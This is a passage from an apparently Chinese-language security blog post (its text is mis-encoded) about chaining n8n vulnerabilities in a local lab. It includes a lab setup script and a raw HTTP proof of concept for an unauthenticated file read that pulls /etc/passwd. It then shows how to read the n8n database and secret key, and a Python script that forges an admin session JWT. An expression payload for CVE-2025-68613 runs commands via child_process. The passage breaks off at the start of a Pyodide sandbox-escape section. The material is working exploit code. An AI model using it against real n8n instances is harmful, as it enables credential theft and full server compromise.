/tmp/cookies.txt <span class="token punctuation">\</span>    <span class="token parameter variable">-d</span> <span class="token string">'&#123;        "name": "Vulnerable Form",        "nodes": [            &#123;                "parameters": &#123;                    "formTitle": "Upload",                    "responseMode": "responseNode",                    "formFields": &#123;"values": [&#123;"fieldLabel": "document", "fieldType": "file", "requiredField": false&#125;]&#125;                &#125;,                "id": "trigger",                "name": "Form Trigger",                "type": "n8n-nodes-base.formTrigger",                "typeVersion": 2.2,                "position": [0, 0],                "webhookId": "vulnerable-form"            &#125;,            &#123;                "parameters": &#123;"respondWith": "binary", "inputDataFieldName": "document"&#125;,                "id": "respond",                "name": "Respond",                "type": "n8n-nodes-base.respondToWebhook",                "typeVersion": 1.1,                "position": [300, 0]            &#125;        ],        "connections": &#123;"Form Trigger": &#123;"main": [[&#123;"node": "Respond", "type": "main", "index": 0&#125;]]&#125;&#125;,        "active": false,        "settings": &#123;"executionOrder": "v1"&#125;    &#125;'</span><span class="token variable">)</span></span><span class="token assign-left variable">ID</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$RESP</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-o</span> <span class="token string">'"id":"[^"]*"'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-1</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">'"'</span> <span class="token parameter variable">-f4</span><span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Workflow ID: <span class="token variable">$ID</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[*] Activating..."</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> PATCH <span class="token string">"<span class="token variable">$BASE_URL</span>/rest/workflows/<span class="token variable">$ID</span>"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-b</span> /tmp/cookies.txt <span class="token punctuation">\</span>    <span class="token parameter variable">-d</span> <span class="token string">'&#123;"active": true&#125;'</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"=========================================="</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Lab ready!"</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Form: http://localhost:5678/form/vulnerable-form"</span><span class="token builtin class-name">echo</span> <span class="token string">"[+] Version: 1.65.0 (VULNERABLE)"</span><span class="token builtin class-name">echo</span> <span class="token string">"=========================================="</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è´¦å¯† admin@exploit.local &#x2F; ExploitLab123!</p><hr><h1 id="CVE-2026-21858-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–"><a href="#CVE-2026-21858-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="CVE-2026-21858 æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–"></a>CVE-2026-21858 æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–</h1><p>å…³äºé…ç½®é¡¹å¯ä»¥æŸ¥é˜…æ–‡æ¡£ï¼Œå®é™…å‚æ•°é‡‡ç”¨é©¼å³°å‘½åæ³•ï¼š <a href="https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.formtrigger/#form-description">https://docs.n8n.io/integrations/builtin/core-nodes/n8n-nodes-base.formtrigger/#form-description</a></p><p>å‰æï¼šç›®æ ‡å¿…é¡»å…·æœ‰å¸¦æœ‰æ–‡ä»¶ä¸Šä¼ å­—æ®µçš„çš„è¡¨å•å·¥ä½œæµï¼Œæœ‰å›æ˜¾ï¼Œæœ€å¥½å·²çŸ¥å¯¹åº”çš„ webhook api</p><p>æ˜“å—æ”»å‡»çš„é…ç½®æ–‡ä»¶ï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"nodes"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Form Trigger"</span><span class="token punctuation">,</span>      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"n8n-nodes-base.formTrigger"</span><span class="token punctuation">,</span>      <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"responseMode"</span><span class="token operator">:</span> <span class="token string">"responseNode"</span><span class="token punctuation">,</span>        <span class="token property">"formFields"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"values"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span> <span class="token property">"fieldLabel"</span><span class="token operator">:</span> <span class="token string">"document"</span><span class="token punctuation">,</span> <span class="token property">"fieldType"</span><span class="token operator">:</span> <span class="token string">"file"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>      <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Respond"</span><span class="token punctuation">,</span>      <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"n8n-nodes-base.respondToWebhook"</span><span class="token punctuation">,</span>      <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"respondWith"</span><span class="token operator">:</span> <span class="token string">"binary"</span><span class="token punctuation">,</span>        <span class="token property">"inputDataFieldName"</span><span class="token operator">:</span> <span class="token string">"document"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"connections"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"Form Trigger"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token property">"main"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span> <span class="token property">"node"</span><span class="token operator">:</span> <span class="token string">"Respond"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæ˜¯æ–‡ä»¶ä¸Šä¼ </p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204154128785.png"></p><h2 id="åŸç†ç®€è¿°"><a href="#åŸç†ç®€è¿°" class="headerlink" title="åŸç†ç®€è¿°"></a>åŸç†ç®€è¿°</h2><p>åœ¨ n8n ä¸­ï¼ŒWebhook ä½œä¸ºå·¥ä½œæµçš„èµ·ç‚¹ï¼Œå¯ä»¥æ•è·æ¥è‡ªè¡¨å•ã€èŠå¤©æ¶ˆæ¯ã€WhatsApp é€šçŸ¥ç­‰ä¼ å…¥çš„æ•°æ®ï¼Œç„¶åä¼šç»è¿‡ä¸­é—´ä»¶ parseRequestBody å¤„ç†</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204155148381.png"></p><p>æ­¤å¤„å¯¹ multipart åŒ…ä½¿ç”¨ <code>parseFormData</code> è¿›è¡Œè§£æè€Œå…¶ä»– contentType åˆ™ä½¿ç”¨ <code>parseBody</code> è¿›è¡Œè§£æï¼Œ<code>parseBody</code> åœ¨è§£æ json åä¼šæŠŠé”®å€¼å¯¹æ·»åŠ åˆ°å…¨å±€çš„ req.body ä¸­</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204155419965.png"></p><p>è€Œæ–‡ä»¶ä¸Šä¼ çš„ multipart åŒ…åœ¨è§£æåä¼šç»è¿‡ Formidable åº“å¤„ç†ï¼Œé€šå¸¸æƒ…å†µ Formidable åº“å¤„ç†åä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°ä¸´æ—¶ç›®å½•ä¸‹çš„éšæœºè·¯å¾„</p><p>ä½†æ˜¯ n8n çš„æ–‡ä»¶ä¸Šä¼ è§£æå™¨è¿™é‡Œå®é™…ä¸Šæ˜¯å°è£…äº† Formidable åº“çš„ parse() å‡½æ•°ï¼Œè§£æåä¼šå°† Formidable åº“çš„è¾“å‡ºå¡«å……è¿› req.bodyï¼Œäºæ˜¯å°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204160100710.png"></p><p>å¾ˆæ˜æ˜¾å¦‚æœåœ¨è°ƒç”¨äº†æ–‡ä»¶ä¸Šä¼ è§£æå™¨çš„æƒ…å†µä¸‹åˆä½¿ç”¨äº† parseBody æ¥è§£æ json é‡Œçš„é”®å€¼å¯¹ï¼Œå°±å¯ä»¥å¯¼è‡´å˜é‡è¦†ç›–</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204160325333.png"></p><p>è€Œè¿™ä¸ªé—®é¢˜ç¡®å®å­˜åœ¨äº n8n çš„å·¥ä½œæµç¨‹ä¸­ï¼š <a href="https://github.com/n8n-io/n8n/commit/c8d604d2c466dd84ec24f4f092183d86e43f2518">https://github.com/n8n-io/n8n/commit/c8d604d2c466dd84ec24f4f092183d86e43f2518</a></p><p>æäº¤è¡¨å•ä½¿ç”¨ <code>formwebhook</code>ï¼Œå®ƒä¼šè°ƒç”¨ <code>prepareFormReturnItem</code>ï¼Œæœ€ç»ˆä¼šè°ƒç”¨ä¸‹é¢è¿™æ®µ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> data<span class="token punctuation">,</span> files <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token literal-property property">processFiles</span><span class="token operator">:</span> MultiPartFormData<span class="token punctuation">.</span>File<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">let</span> multiFile <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>processFiles<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">...</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>multiFile <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>processFiles<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> fileCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> file <span class="token keyword">of</span> processFiles<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">let</span> binaryPropertyName <span class="token operator">=</span> key<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>binaryPropertyName<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>binaryPropertyName <span class="token operator">=</span> binaryPropertyName<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>multiFile<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>binaryPropertyName <span class="token operator">+=</span> fileCount<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>binaryPropertyName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>binaryPropertyName <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>options<span class="token punctuation">.</span>binaryPropertyName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>count<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>returnItem<span class="token punctuation">.</span>binary<span class="token operator">!</span><span class="token punctuation">[</span>binaryPropertyName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> context<span class="token punctuation">.</span>nodeHelpers<span class="token punctuation">.</span><span class="token function">copyBinaryFile</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span>file<span class="token punctuation">.</span>originalFilename <span class="token operator">??</span> file<span class="token punctuation">.</span>newFilename<span class="token punctuation">,</span>file<span class="token punctuation">.</span>mimetype<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Delete original file to prevent tmp directory from growing too large</span><span class="token keyword">await</span> <span class="token function">rm</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>filepath<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">force</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>count <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copyBinaryFile ä¼šè°ƒç”¨ req.body.files æŠŠæ–‡ä»¶ä»æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„å¤åˆ¶åˆ°æŒä¹…å­˜å‚¨</p><p>è€Œè¿™ä¸€è¿‡ç¨‹æ²¡æœ‰éªŒè¯æ˜¯å¦ä¸º multipart&#x2F;form-dataï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨ json æ§åˆ¶å…¶ filepathï¼Œäºæ˜¯è¿™ä¸ª api ä¸€æ—¦ä¼šå›æ˜¾æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®š filepath ä¸ºæœ¬åœ°è·¯å¾„ä»è€Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼ŒæŠ“åŒ…ä¿®æ”¹ multipart åŒ…ä¸º json è¯·æ±‚ä½“</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/form/vulnerable-form</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:5678</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br, zstd</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:5678/form/vulnerable-form</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:5678</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">419</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token application-json"><span class="token punctuation">&#123;</span>    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"files"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"field-0"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"filepath"</span><span class="token operator">:</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span>            <span class="token property">"originalFilename"</span><span class="token operator">:</span> <span class="token string">"1.pdf"</span><span class="token punctuation">,</span>            <span class="token property">"mimetype"</span><span class="token operator">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span>            <span class="token property">"extension"</span><span class="token operator">:</span> <span class="token string">""</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204154637463.png"></p><p>å®ç°äº†ä»»æ„æ–‡ä»¶è¯»å–</p><hr><h2 id="è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œç™»å½•-admin"><a href="#è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œç™»å½•-admin" class="headerlink" title="è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œç™»å½• admin"></a>è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œç™»å½• admin</h2><p>n8n å°† session å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º <code>n8n-auth</code>Â çš„ cookie ä¸­ï¼Œä»¥ jwt HS256 åŠ å¯†è¿™ä¸ª bodyï¼š</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204170744345.png"></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¯»å–ç›¸å…³æ–‡ä»¶ï¼Œæ‹¿åˆ° idï¼Œemailï¼Œpassword_hash å’Œ secret_keyï¼Œå¯¹äº docker èµ·åˆ° n8nï¼Œå‰ä¸‰è€…åœ¨ <code>$HOME/.n8n/database.sqlite</code> è¿™ä¸ªæ•°æ®åº“é‡Œï¼Œkey åœ¨ <code>$HOME/.n8n/config</code></p><p>å…ˆæŸ¥çœ‹å½“å‰ç”¨æˆ·ç›®å½•</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204171658000.png"></p><p>ç„¶åè¯»å–å¯¹åº”å†…å®¹</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204172035780.png"></p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260204172051181.png"></p><p>æ¥ä¸‹æ¥ç”Ÿæˆ jwt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> jwt<span class="token keyword">def</span> <span class="token function">forge_token</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> uid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> email<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> pw_hash<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    secret <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pw_hash<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>    admin_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> uid<span class="token punctuation">,</span> <span class="token string">"hash"</span><span class="token punctuation">:</span> h<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token string">"HS256"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> admin_token<span class="token keyword">print</span><span class="token punctuation">(</span>    forge_token<span class="token punctuation">(</span>        <span class="token string">"jpmCgd+nc7oTbAlnxPStjptYBmAxYOAV"</span><span class="token punctuation">,</span>        <span class="token string">"0121c327-fdce-4a0a-a6c1-38b3bf6bb617"</span><span class="token punctuation">,</span> <span class="token string">"admin@exploit.local"</span><span class="token punctuation">,</span>        <span class="token string">"$2a$10$InghmOrG5qXvBZ1FupblleSjxvM0L520sU3BFMxTxq9NLN.FQvO7e"</span>    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjAxMjFjMzI3LWZkY2UtNGEwYS1hNmMxLTM4YjNiZjZiYjYxNyIsImhhc2giOiJjTkdQUFhlZzRXIn0.mLSYi6FNf9ZcDmWdF1TEsHYTTTEnjYsQyJO-DaPLgyw </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åå°±èƒ½è®¿é—®äº†</p><hr><h1 id="CVE-2025-68613-RCE"><a href="#CVE-2025-68613-RCE" class="headerlink" title="CVE-2025-68613 RCE"></a>CVE-2025-68613 RCE</h1><p>è¿›å…¥åå°åï¼Œæ–°å»º workflow</p><p>æ·»åŠ  â€œManual Triggerâ€ èŠ‚ç‚¹ï¼Œæ·»åŠ  â€œSetâ€ èŠ‚ç‚¹ï¼Œè¿æ¥å®ƒä»¬</p><p>ç„¶åè¿›å…¥ Set èŠ‚ç‚¹çš„è®¾ç½®ï¼Œæ·»åŠ  String valueï¼Œname å–åä¸º resultï¼Œä½¿ç”¨ expression æ¨¡å¼ï¼Œç„¶åæ‰“å…¥ payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205110312525.png"></p><p>ç„¶åæ‰§è¡Œ test step</p><p><img src="/blog/2026/02/04/n8n%E4%B8%8E%E5%AE%83%E7%9A%84%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/IMG-20260205110448615.png"></p><p>æˆåŠŸå‘½ä»¤æ‰§è¡Œ</p><hr><h1 id="CVE-2025-68668-Pyodide-æ²™ç®±é€ƒé€¸"><a href="#CVE-2025-68668-Pyodide-æ²™ç®±é€ƒé€¸" class="headerlink" title="CVE-2025-68668 Pyodide æ²™ç®±é€ƒé€¸"></a>CVE-2025-68668 Pyodide æ²™ç®±é€ƒé€¸</h1><p>n8n ä¸­æä¾›äº†ä¸€ä¸ª Code èŠ‚ç‚¹å¯ä»¥åœ¨æ²™ç›’å†…æ‰§è¡Œ Javascript&#x2F;Python ä»£ç ï¼Œå…¶ä¸­ Python æ²™ç›’æ˜¯åŸºäº Pyodide å®ç°çš„</p><p>ä¾æ—§éœ€è¦åå°æƒé™</p><p>æ¼æ´å½±å“ï¼š1.0.0 &lt;&#x3D; n8n &lt; 2.0.0</p><p>åœ¨ Pyodide ä¸­è¿è¡Œçš„ Python ä»£ç é€šè¿‡ JavaScript Bridge è·¨è¶Šæ²™ç®±è¾¹ç•Œã€‚é€šè¿‡è¯¥æ¡¥æ¥å™¨ï¼Œå°†è°ƒç”¨æœªå—é™çš„ Node.js APIï¼Œè¿™äº› API æä¾›å¯¹è¿›ç¨‹ç®¡ç†å’Œæ–‡ä»¶ç³»ç»Ÿæ“ä½œç­‰æ¨¡å—çš„è®¿é—®ã€‚å› æ­¤ï¼Œæ”»å‡»è€…èƒ½å¤Ÿä»¥ n8n è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>åˆ›å»ºä¸€ä¸ªæ–°çš„ Workflow å¹¶æ·»åŠ ä¸€ä¸ª Python ä»£ç èŠ‚ç‚¹ã€‚å½“å‰ç¯å¢ƒä¸­å¯¹æ²™ç®±è¿›è¡Œäº†åŠ å›ºï¼Œé™åˆ¶å¯¹Â <code>require</code>Â çš„ç›´æ¥è°ƒç”¨ã€‚ä½¿ç”¨æ–‡ç« ä¸­çš„Â <a href="https://www.smartkeyss.com/post/cve-2025-68668-breaking-out-of-the-python-sandbox-in-n8n">poc</a>Â è¿›è¡ŒéªŒè¯ï¼Œå°†æŠ¥é”™Â <code>ReferenceError: require is not 